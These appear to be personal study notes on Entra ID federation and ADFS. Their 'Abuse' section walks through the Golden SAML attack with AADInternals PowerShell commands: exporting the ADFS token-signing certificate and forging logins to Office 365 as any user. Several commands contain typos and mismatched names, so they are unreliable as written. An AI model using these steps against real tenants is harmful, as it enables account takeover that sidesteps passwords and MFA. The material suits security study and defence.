- For federation a trust needs to be established between unrelated parties like on-prem Active Directory and Entra ID
- All authentication occurs in the on-prem environment and the user experiences SSO across all the trusted environments
- Users can access cloud applications by using their on-prem credentials

![[Pasted image 20241124003330.png]]

In any federation setup there are 3 parties:
- User or Client 
- Identity Provider (IdP)
- Service Provider (SP)

The identity provider authenticates the user and then the user can access a service on the service provider. 

Security Assertion Markup Language (SAML) is used for exchanging all the authentication and authorization information between the providers.
![[Pasted image 20241124003720.png]]

`https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps`

## ADFS
- AD FS is a claims-based identity model
- claims are simply statements made by users that are used primarily for authorizing access to claims-based applications located anywhere on the internet. 
- Claims for a user are written inside the SAML tokens and are then signed to provide integrity by the IdP.
- A user is identified by ImmutableID. It is globally unique and stored in Entra Id
- the ImmutableID is stored on-prem as ms-DC-ConsistencyGuid for the user and/or can be derived from the GUID of the user. 

# Abuse
- In ADFS, SAML Response is signed by a token-signing certificate 
- if the certificate is compromised, it is possible to authenticate to the Entra ID as any user in Entra ID.
- Just like our PTA abuse, password change for a user or MFA won't have any effect because we are forging the authentication response.
- the certificate can be extracted from the AD FS server with DA privileges and then can be used from any internet connected machine 
- this is what the infamous golden SAML attacks is
`https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps`
## On-Prem to Cloud
- from any on-prem machine as a normal domain user, get the ImmutableID of the target user.
`[System.Convert]::ToBase64String((Get-ADUser -Identity onpreuser | select -ExpandProperty ObjectGUID).tobytearray())`
- On AD FS server (as administrator)
` Get-AdfsProperties | select identifier`
- Check the IssuerURI from Entra ID too(use MSOL module and need GA privs)
` Get-MsolDomainFederationSettings -DomainName deffin.com |select IssuerUri`

Note when setting up AD FS using Entra Connect there is a difference between IssuerURI on ADFS server and Entra ID. Use the one from Azure AD.

- with DA privileges on-prem we can extract the ADFS token certificate from the ADFS server using AADInternals
` Export-AADIntADFSSigningCertificate`
- use the below command from AADInternals to access cloud apps as the user whose immutableID is specified
` Open-AADIntOffice365Portal -ImmutableID v1poc7Pz8kaT6JKQ== -Issuer http://deffin.com/adfs/services/trust -Pfx c:\user\asfsadmin\services\trust -PfxFileName c:\users\adfsadmin\Documents\ADFSSignCertifcate.pfx`

With DA privileges on-prem its possible to create ImmutableID of cloud only users with access to Entra Connect Sync credentials
- Create a realistic ImmutableID and set it for a cloud only user
` [System.Convert]::Base64String((New-Guid).tobytearray())`
` Set-AADIntAzureADObject -CloudAnchor "user-594...." -SourceAnchor "pwr...==`
- Using AADInternals export the token signing certificate. 
` Export-AADIntADFSSignCertificate`
- User the belwo command from AADInternals to access cloud apps as the user whose ImmutableID is specified. 
` OpenAADIntOfficae365Portal ImmutableID "pwr..." -Issuer http://deffin.com/adfs/service/trust -PfxFileName c:\users\adfsadmin\Documents\ADFSSignCertifcate.pfx -Verbose`

